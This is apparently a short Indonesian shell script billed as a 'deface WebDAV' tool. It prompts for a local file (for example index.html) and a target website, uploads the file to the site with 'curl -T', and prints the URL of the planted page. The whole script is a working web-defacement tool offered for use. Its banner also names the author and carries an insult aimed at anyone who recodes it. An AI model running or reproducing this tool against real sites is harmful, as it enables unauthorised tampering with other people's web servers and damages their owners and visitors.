figlet -f slant MR.4LD1 | lolcat

echo  "_____________________________________________________________" |lolcat
echo  "[TYPE      : TOOLS DEFACE WEBDAV] " | lolcat
echo  "[AUTHOR    : MR.4LD1] " | lolcat
echo  "[Fb        : M Aldi Triprasetya " | lolcat
echo  "[NOTES     : YANG RECODE ANAK HARAM] " | lolcat
echo  "[THANKS TO : GOD]" | lolcat
echo  "_____________________________________________________________" | lolcat
sleep 1

echo  "${y} {1} MASUKAN NAMA SCRIPT [SAVE ON STORAGE,ex:index.html]${endc}:" | lolcat
read sc
echo
echo "${y} {2} MASUKAN WEB TARGET" | lolcat
read web
curl -T /sdcard/$sc $web
echo "${y} [OUTPUT]=" $web/$sc | lolcat

